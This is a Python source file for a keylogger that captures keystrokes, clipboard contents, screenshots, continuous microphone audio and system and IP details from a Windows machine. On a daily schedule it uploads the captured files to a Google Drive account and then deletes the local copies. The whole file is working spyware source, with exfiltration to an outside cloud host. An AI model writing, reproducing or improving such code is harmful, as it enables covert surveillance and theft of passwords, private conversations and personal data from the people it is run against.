import os
import time
import socket
import platform
import win32clipboard
import threading
import queue
import sounddevice as sd
from scipy.io.wavfile import write
from PIL import ImageGrab
from requests import get
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
from pynput.keyboard import Key, Listener
import schedule

class Keylogger:
    def __init__(self):
        self.keys_information = "key_log.txt"
        self.system_information = "system_info.txt"
        self.clipboard_information = "clipboard.txt"
        self.audio_information = "audio.wav"
        self.screenshot_information = "screenshot.png"

        self.file_path = "C:\\Users\\Jaith\\Desktop\\Project"
        self.extend = "\\"
        self.file_merge = self.file_path + self.extend

        self.keys = []
        self.count = 0
        self.queue = queue.Queue()
        self.listener_thread = None
        self.audio_thread = None

        self.initialize_files()
        self.authenticate_drive()

    def initialize_files(self):
        files = [self.keys_information, self.system_information, self.clipboard_information]
        for file in files:
            with open(self.file_merge + file, 'w') as f:
                pass

    def authenticate_drive(self):
        self.gauth = GoogleAuth()
        self.gauth.LoadCredentialsFile("mycreds.txt")
        if self.gauth.credentials is None:
            self.gauth.LocalWebserverAuth()
        elif self.gauth.access_token_expired:
            self.gauth.Refresh()
        else:
            self.gauth.Authorize()
        self.gauth.SaveCredentialsFile("mycreds.txt")
        self.drive = GoogleDrive(self.gauth)

    def upload_file_to_drive(self, file_path, file_name):
        try:
            print(f"Uploading {file_name} to Google Drive...")
            file_drive = self.drive.CreateFile({'title': file_name})
            file_drive.SetContentFile(file_path)
            file_drive.Upload()
            print(f"Successfully uploaded {file_name} to Google Drive.")
            threading.Timer(300, self.delete_file, args=[file_path]).start()
        except Exception as e:
            print(f"Failed to upload {file_name} to Google Drive: {e}")

    def delete_file(self, file_path):
        try:
            os.remove(file_path)
            print(f"Successfully deleted {file_path}")
        except Exception as e:
            print(f"Failed to delete {file_path}: {e}")

    def computer_information(self):
        with open(self.file_merge + self.system_information, "w") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip + "\n")
            except Exception:
                f.write("Couldn't get Public IP Address (most likely max query)\n")

            f.write("Processor: " + (platform.processor()) + '\n')
            f.write("System: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("Private IP Address: " + IPAddr + "\n")

    def copy_clipboard(self):
        with open(self.file_merge + self.clipboard_information, "w") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("Clipboard Data: \n" + pasted_data + "\n")
            except:
                f.write("Clipboard could not be copied\n")

    def microphone(self):
        fs = 44100
        try:
            while True:
                myrecording = sd.rec(int(24 * 60 * 60 * fs), samplerate=fs, channels=2)
                sd.wait()
                write(self.file_merge + self.audio_information, fs, myrecording)
        except Exception as e:
            print(f"Failed to record audio: {e}")

    def upload_audio_recording(self):
        self.upload_file_to_drive(self.file_merge + self.audio_information, self.audio_information)

    def screenshot(self):
        try:
            im = ImageGrab.grab()
            im.save(self.file_merge + self.screenshot_information)
        except Exception as e:
            print(f"Failed to take screenshot: {e}")

    def on_press(self, key):
        self.queue.put(('press', key))
        print(f"Key pressed: {key}")  # Debugging print statement

    def on_release(self, key):
        self.queue.put(('release', key))
        print(f"Key released: {key}")  # Debugging print statement
        if key == Key.esc:
            return False

    def process_queue(self):
        while True:
            try:
                event_type, key = self.queue.get(timeout=1)
                if event_type == 'press':
                    self.keys.append(key)
                    self.count += 1

                    if self.count >= 1:
                        self.count = 0
                        self.write_file(self.keys)
                        self.keys = []
                elif event_type == 'release':
                    pass
            except queue.Empty:
                continue

    def write_file(self, keys):
        with open(self.file_merge + self.keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)
                elif k.find("digit") > 0:
                    f.write(k[-1])

    def daily_tasks(self):
        self.computer_information()
        self.screenshot()
        self.copy_clipboard()

        files_to_upload = [
            (self.file_merge + self.screenshot_information, self.screenshot_information),
            (self.file_merge + self.clipboard_information, self.clipboard_information),
            (self.file_merge + self.system_information, self.system_information),
            (self.file_merge + self.keys_information, self.keys_information)
        ]

        for file_path, file_name in files_to_upload:
            self.upload_file_to_drive(file_path, file_name)

    def schedule_tasks(self):
        schedule.every().day.at("11:52").do(self.daily_tasks)
        schedule.every().day.at("11:53").do(self.upload_audio_recording)
        while True:
            try:
                schedule.run_pending()
                time.sleep(1)
            except Exception as e:
                print(f"Error while running scheduled tasks: {e}")

    def start_keylogger(self):
        print("Starting keylogger...")

        self.listener_thread = threading.Thread(target=self.process_queue)
        self.listener_thread.start()

        self.audio_thread = threading.Thread(target=self.microphone)
        self.audio_thread.start()

        schedule_thread = threading.Thread(target=self.schedule_tasks)
        schedule_thread.start()

        while True:
            with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start_keylogger()
